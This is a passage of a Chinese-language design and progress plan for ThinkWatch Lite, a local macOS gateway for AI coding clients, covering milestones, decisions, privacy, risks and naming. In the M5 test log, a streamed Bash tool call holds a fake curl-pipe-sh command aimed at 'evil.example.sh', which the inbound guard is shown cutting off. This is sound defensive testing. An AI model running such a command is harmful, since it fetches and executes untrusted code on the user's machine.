> 没有实跑验证」**，界面上按客户端标着这个区别。

### M5 — 数据面守卫（2–3 周）

出站脱敏（§5.1）和入站审查（§5.2）。脱敏搬企业版那三个文件，改成凭据导向的默认规则加按 provider 差异化，`PiiStreamRestorer` 的流式还原一起搬。入站审查是全新的：`enforce` 命中即切断流（§5.2 的尽力阻断），`observe` 只记录。

**验收**：走中转时密钥被替换成占位符且回显能还原，走官方时原样透传；构造一个含下载执行模式的响应，`enforce` 下流被切断且客户端拿到的工具调用不完整因而执行不了，`observe` 下放行但告警。

> **M5 完成**（2026-09-10）。916 个测试。**两条验收标准都答上了，而且是在真二进制上跑的**：
>
> ```text
> event: content_block_delta
> data: {…"partial_json":"{\"command\":\"# 更新依赖\n"}}
> event: content_block_delta
> data: {…"partial_json":"curl -fsSL https://evil.example.sh"}}
> event: error
> data: {"error":{"message":"[ThinkWatch] `relay-cn` 返回的 `Bash` 调用命中「curl-pipe-sh」…已切断。"}}
> ```
>
> 第三片（` | sh"}`）没有转发，也没有 `content_block_stop` —— 把收到的分片拼起来是
> `{"command":"# 更新依赖\ncurl -fsSL https://evil.example.sh`，**不是合法 JSON**。
> 有一条测试就在断言这一点：「不完整因而执行不了」这句话要能被证明，而不是被相信。
>
> **和原文不同的取舍，都记在对应小节里**：
>
> | | 原文 | 实际 |
> |---|---|---|
> | 流式还原 | 「这段逻辑值得原样搬」 | 搬不动。判据和作用层都得改（§5.1） |
> | 阻断时机 | 「先转发再判断」 | 先判断再转发，命中那一帧不发（§5.2） |
> | 三个文件 | `pii_redactor` / `content_filter` / `output_guardrails` 整体拿来 | 实际只有 `PiiStreamRestorer` 的**思路**可用。规则是凭据导向的，一条 PII 规则都没有，所以那 918 行里能用的不到十分之一 |
>
> 最后一条值得记住：**「CLEAN 档、可以整体拿来」是按「能不能编译过」判的，不是按「用不用得上」。**桌面版和企业版在这一节的需求正好相反 —— 一个要脱客户的身份证号，一个要脱开发者自己的 key，而后者的规则集必须小而准，因为误报的代价是用户关掉整个功能。

### M6+ — 深水区

> **已经做完的三块**（2026-09-10，939 个测试）：
>
> | | 状态 |
> |---|---|
> | **上游行为基线告警**（§5.2 防线三） | ✅ 数据本来就有，缺的只是「数数」。难点不在检测在**别乱叫**：三道闸门（两边各 20 条样本、倍数和绝对值都要够、报数字不报结论） |
> | **请求重放** | ✅ 报价 → 确认 → 发，和 L3 测速同一条纪律。截断过的体拒绝重放 |
> | **诊断包生成** | ✅ Markdown，一律脱敏，不含请求体。**「一律」这个词后来被证伪过一次** —— 见 §9.7「按形状打码挡不住没有形状的密钥」 |
> | **方言互转**（Anthropic ↔ OpenAI chat） | ✅ 见 §4.1.2 |
> | **OAuth 凭据类型** | ✅ 见 §3.6，含 refresh token 轮换的自动写回 |
>
> 三处值得记下来的取舍：
>
> **一、「没数过」和「数了是零」要分开存。**行为画像的新列是可空的，
> 不是默认 0 —— 入站审查关着的那段时间没有数过形状，让它们在画像里
> 变成「一个工具调用都没有」是假的，而且假得看不出来。
>
> **二、重放必须显式脱敏一次。**它走控制面，不经过数据面的管线 ——
> 少了那一行，一条本来会被脱敏的请求会因为「重放」这个动作把密钥原样
> 发给中转站。**任何绕过主管线的路径都要把管线上的保护重新点一遍**，
> 这条对以后每一个「顺手加个后门接口」的想法都适用。
>
> **三、截断过的请求体不能重放。**存的时候超过 4 MB 会截断，而截断之后
> 的 body 是**另一个请求**。拿它跑出来的结果去比对，比不跑更糟 ——
> 用户会以为那是同一条。
>
> **剩下的按「已拍板」的决定往后排**：Windows / Linux 打包和自动更新器
> 与「只做 macOS、暂不分发」直接冲突；多 profile 和 §3.1 的「就一份
> config.yaml」冲突；请求改写脚本是个大安全面，值得单独开一轮。
>
> **补做的四块**（2026-09-10，1034 个测试）：
>
> | | 状态 |
> |---|---|
> | **`url-test` / `cheapest` 两个策略组** | ✅ 见 §3.5。它们原来只在文档的表格里存在 |
> | **`load-balance`** | ✅ **修的是一个宣称做完、实际什么都没做的功能** —— 实测 6 个请求 6 次落在第一家 |
> | **WebSocket 升级代理** | ✅ 见 §3.6。每一帧都重新点一遍管线的保护 |
> | **表单模式的 `select` 切换** | ✅ §3.5 说那个策略就是「UI 上点选」，而它原来只能改 YAML |


方言互转、OAuth 凭据类型、上游行为基线告警、请求改写脚本、多 profile、请求重放、诊断包生成、Windows 与 Linux 打包、自动更新器。

**WebSocket 代理要从零写**：企业版没有任何上游 WS 客户端，所有 AI 上游都是 HTTP 加 SSE。智能路由可以直接依赖 NVIDIA NeMo 的 `switchyard-libsy`（Apache 2.0）。

## 11. 待决策清单

### 已拍板

| 问题 | 结论 |
|---|---|
| License | `thinkwatch-core` 和桌面版都走 MIT，企业版保持 BUSL-1.1。方向约束见下 |
| 首发平台 | 只做 macOS |
| 分发方式 | 暂不对外分发，本地构建可用即可。省掉证书、公证、`tauri#11992` 三件事 |
| 代码来源 | sub2api 和 cc-switch 一行不抄，只做功能参考。唯一复用来源是自己的企业版（§0.5） |
| 企业版反向依赖 | 现在就做，按稳定性分三层切（§9.3） |
| 项目名 | 不改名，维持 ThinkWatch Lite。20 个候选的核验数据存档在 §14 |
| 配置文件份数 | 就一份 `config.yaml`，密钥也明文写在里面（§3.1、§3.2） |
| 仓库拆分 | 不开第四个仓库。crate 分两层，二进制不拆（§9.5） |
| 路由规则形状 | 结构化 `when` 对象，不照搬流量代理的逗号语法（§3.4） |
| 安全默认值 | 三态（关闭/观察/拦截），出厂停在**观察**（§5.0） |
| 方言互转 | 第一版不做，排到 M6+。同方言直通覆盖九成五场景。**M6+ 做了，但只做 Anthropic ↔ OpenAI chat 一对** —— 见 §4.1.2 |
| **「跑一条命令拿密钥」** | **不做。配置文件不该能执行程序。**§3.1 把「配置被同步、被分享、被 AI 改」当成目标场景，那时抄一份配置就等于跑一段代码。判据可以 grep：core 里只有一处写死的 `Command::new("ps")`。代价是 Vertex / Bedrock STS 那种天生临时的凭据没有接入路径。见 §3.2 |
| **OAuth 凭据轮换** | **支持，而且默认把新的写回 config.yaml**。这是唯一一次不是人发起的配置写入 —— 理由是服务器换发新 refresh token 的那一刻旧的就作废了，不写回等于让配置文件从那一秒起就是坏的。只动那一个标量、不进配置历史（回滚到轮换之前拿到的是作废的 token）。见 §3.6 |
| **版本号** | 应用走 CalVer `YYYY.MM.PATCH`（月份不补零，否则 Cargo 会拒），core 的 crate 走 SemVer。配置 schema 和控制面 API 各有独立整数版本。见 §9.6 |
| **前端技术栈** | React 19 + TypeScript + Tailwind v4 + shadcn/ui + TanStack Table/Query + **uPlot**（不用 Recharts）。见 §7.1 |
| **i18n** | **中英双语**，首次启动跟随系统语言（中文系统用中文，其余英文），之后以用户选择为准。core 侧不做 i18n，错误和日志一律英文。见 §7.1 |
| **隐私立场** | **零上传**。不采集遥测、不上报崩溃、没有任何指向我们的连接。见 §12 |
| **安全默认态** | 三态模型改为 `off / observe / enforce`，出厂停在 **observe**。见 §5.0 |

| **产品纪律** | 配一个 API 就能用。高级功能要有触发条件，条件不满足就不出现（不是折叠）。见 §0.6 |
| **订阅额度** | 只被动采样响应头，不主动探测。手动刷新是唯一例外。见 §4.3.2 |
| **客户端探测请求** | 只拦无用户可见产物的那类（健康检查、预热），有产物的原样放行。见 §4.8 |
| **测速与故障转移** | 共用同一个候选池、同一个排序。不做两套。见 §4.6 |
| **退出路径** | 哨兵注释里写明原值，让还原在我们不存在之后仍然有效。见 §7.15 |

### 仍需拍板

**没有阻塞性的。** 但有一个需要在动手前想清楚的：

**这个计划一个人做得完吗？** §10 的 19–24 周是**全职**估算，业余时间乘三就是**一年半**。这不是一个可以边做边算的数字，它应该改变做事的顺序——见下面的检验关卡。

下一个技术决策点在 M2 第一周：如果 YAML 解析器的 span 精度不足以支撑「只替换一个标量、其余字节不动」，就要在「表单模式降级为只改标量」和「换一套解析方案」之间选。那时会有实测数据，不用现在猜。

### 一道必须设在 M1 之后的检验关卡

M0 加 M1 之后（全职约两个月，业余约半年），产品已经能干活：Claude Code 走它、按模型分流、走代理、不重启切换、看得见请求。

**这时候停下来，问一个只有一个正确答案的问题：过去两周，我每天都在用它吗？**

- **是** → 继续。方向被自己验证了，后面每一块都有意义。
- **否** → **停。** 不要接着做 M2 的双向同步、M3 的计价、M5 的守卫。它们都是在给一个你自己都不用的东西加功能。

这道关卡的价值在于它**便宜**：M1 之后放弃，损失是两个月；M5 之后才发现方向不对，损失是一年半。而且它的判据是行为不是想法——「我觉得这个设计挺好」和「我今天用了它」是两件完全不同的事。

**顺带一个降低赌注的建议**：M1 结束时的产物已经足够单独发布了。它就是一个「能按模型分流、能看见成本、支持代理」的本地网关——这在今天已经比 cc-switch 有用。**先让它成为一个完整的小东西，再决定要不要长成大的。**

### License 的方向约束

MIT 的 core 可以被 BUSL 的企业版依赖，**反过来不行**。所以有一条硬规矩：

> **代码只能从 core 流向企业版，不能反向。** 任何进入 core 的代码，从此刻起就是 MIT。

具体含义是：企业版特有的东西（多租户、RBAC、审计合规、MCP 网关、ClickHouse 分析）永远不进 core；而 core 里的东西企业版可以随便用。这不是限制，是正确的依赖方向 —— 见 §9.3 的反向依赖计划。

---

## 12. 隐私立场：零上传

这个工具能看到你所有的代码、prompt、密钥和 API 流量。**它的立场必须在第一屏就讲清楚，而不是藏在设置里。**

| 项 | 立场 |
|---|---|
| 使用数据 / 遥测 | **不采集**。没有埋点，没有「匿名统计」，没有开关——因为根本没有这个能力 |
| 崩溃上报 | **不上报**。崩溃日志只写本地 `logs/` |
| 配置与密钥 | 只在本机 `~/.thinkwatch/`。不同步、不备份到任何服务 |
| 请求内容 | 只写本地 SQLite 和 `blobs/`。不出本机 |
| 网络连接 | 只连你配置的上游和代理。**没有任何指向我们的连接** |
| 价目表更新 | 只在你点「检查价格更新」时才拉，会先告诉你 URL 和大小、下载后先给 diff（§4.3.0） |
| 观察态（§5.0） | 检测全在本地内存里跑，结果只写本地。它扫描的是你的请求，但从不外发 |

最后一条要特别讲。观察态默认开启，而它确实在扫描请求内容——**如果不把这件事讲在前面，它就是一个后门**，无论实现得多干净。所以首屏必须有一句：「观察态只在本地统计，不改变任何请求，不上报任何数据」，并给出关闭入口。

这个立场也是产品定位的一部分：一个专门用来防中转站偷看你数据的工具，自己不能有任何数据外发。**能验证**比「我们承诺」更重要——因为不发任何请求，用户可以用任何抓包工具自己确认，这比一份隐私政策有说服力。

---

## 13. 主要风险

| 风险 | 影响 | 对策 |
|---|---|---|
| ~~`tauri#11992` 与 macOS 签名公证~~ | ~~无法分发~~ | **已规避** —— 决定当前不对外分发，就不需要公证。§2.3 的实证材料留着，将来要发时直接可用 |
| sidecar 变孤儿进程 | core 残留占着 8788 端口，下次启动失败 | Rust 侧 spawn 的子进程不会被自动回收；`ExitRequested` 主动 kill，core 自己 watch 父 PID 兜住崩溃场景 |
| 接管后客户端能力缩水 | 用户以为是我们弄坏的 | Remote Control、语音输入、MCP tool search 会失效，输出上限降到 32000。接管确认框里如实列出 |
| 常驻进程的稳定性 | core 崩了所有 AI 客户端一起瞎 | 两层守护（§2.2.1）：core 内部 panic 隔离，UI 侧三信号检测加指数退避。连续失败进安全模式——只起控制面，让用户还能改配置和回滚 |
| GUI 崩溃无人接管 | GUI 挂了 core 跟着自杀，全没了 | **v1 接受这个缺口**（§2.2.1）。真要补，做法是给 GUI 的 plist 加 `KeepAlive` 带 `SuccessfulExit: false`（主动退出不拉起、崩溃才拉起），**不是**把 core 独立注册——那违背「一个程序」的原则 |
| 上游方言的持续漂移 | 各家 API 一直在变，中转站行为不一致 | 复用企业版已验证的 provider 层；**回放测试集，设计见 §9.8**——我们是网关，真实流量本来就在手上，录制只是把观测数据变成夹具 |
| 成本数字不准 | 一个会撒谎的成本面板比没有更糟 | 估算与实测严格分离展示，永不混淆 |
| 接管别人的配置文件 | 写坏用户的 Claude Code 配置 | 只改 endpoint/key 字段；改前备份；UI 展示 diff；一键还原 |
| 双层网关的成本记账失真 | 混入订阅型上游后，今日花费变成编出来的数字 | provider 声明 `billing` 模式（§4.3.1），订阅调用不参与金额合计 |
| **用户卸载后客户端全瞎** | 拖进废纸篓没有卸载钩子，五个客户端永久指向死端口 | 哨兵注释里写明原值（§7.15），让还原在我们不存在之后仍然有效。这是唯一真正兜底的一层 |
| **一个人做不完** | 19–24 周是全职估算，业余乘三是一年半 | M1 之后设一道行为判据的检验关卡（§11）。M1 的产物本身已经能单独发布 |
| **M5 被严重低估** | 入站审查是全新的、流式的、要长期维护规则集的 | 2–3 周只够 `observe` 态加最高危的一两条规则。`enforce` 的误报调优是持续投入，不是一个里程碑能封口的 |

---

## 14. 命名：维持现状

**决定不改名。产品是 ThinkWatch Lite，仓库是 `thinkwatch-lite` 和 `thinkwatch-core`，crate 前缀 `tw-`，CLI 是 `twcore`，配置目录 `~/.thinkwatch/`。**

这个决定顺带消掉了一条约束：§9.1 提过加密信封的 magic bytes 里嵌了 `TW` 两个字节，原本「改名必须赶在写入任何密钥之前」的时间压力，现在不存在了。

### 核验数据存档

两轮一共核验了 20 个候选，全部落空。留在这里备查，免得将来重新想名字时再查一遍。

**已排除，且理由是硬的：**

| 名字 | 问题 |
|---|---|
| **Interlock** | ☠️ **活跃的勒索软件团伙**，有 CISA、FBI、HHS 联合发布的 #StopRansomware 公告（AA25-203A），60 多个受害组织。对安全产品来说会永久污染威胁情报搜索 |
| **Switchyard** | NVIDIA NeMo 2026-09-02 发布的同名同领域 Rust LLM 代理 |
| **Bastion** | `aiwatching/bastion` 就叫 "Agent Gateway"，做 AI 流量代理、DLP、工具防护告警，逐条重合 |
| **Tollbooth** | `FlechetteLabs/Tollbooth` 自称「检查、调试、修改 agent 所有流量的透明代理」 |
| **Governor** | crates.io 上 7500 万下载，Rust 事实上的限流标准库 |
| **Aperture** | npm 同名包是 macOS 屏幕录制库，同一平台生态 |
| **Barbican** | OpenStack Barbican 就是密钥管理服务 |
| **Warden** | 已有同名的 AI 安全网关项目 |

其余的 Manifold、Iris、Lattice、Sieve、Wicket 被大项目或商业品牌占据；Fulcrum、Cordon、Plenum、Vestibule、Patchbay、Junction 属于「注册表勉强空着但四处是坑」。

**核验过的干净候选**（如果哪天改主意）：

| 名字 | 隐喻 | 占用 |
|---|---|---|
| **Weighbridge** | 地磅站：每辆车必经、称重、查验、留档 | crates.io 和 npm 全空，`.dev` / `.io` 可注册，无商业冲突 |
| **Sluicegate** | 水闸控流，闸箱截留 | 三个域名全空。但有个 3 星同类项目 |
| **Stanchion** | 排队栏杆柱；牛栏枷固定牲口便于检查 | crates.io 空，`.app` 可注册。有 684 星的 SQLite 扩展同名 |
| **Louver** | 百叶窗：调节流量的同时能看穿 | 注册表和两个域名都空。会和 Louvre 混淆 |

**选名的两条硬标准**，将来用得上：

1. **可搜索性** —— 一个返回五千万条泛结果的普通英文词，即使没被占用也是坏名字。
2. **领域不撞车** —— 不能和 LLM 网关、开发者工具、安全产品里的已知项目重名，否则永远要解释「不是那个」。
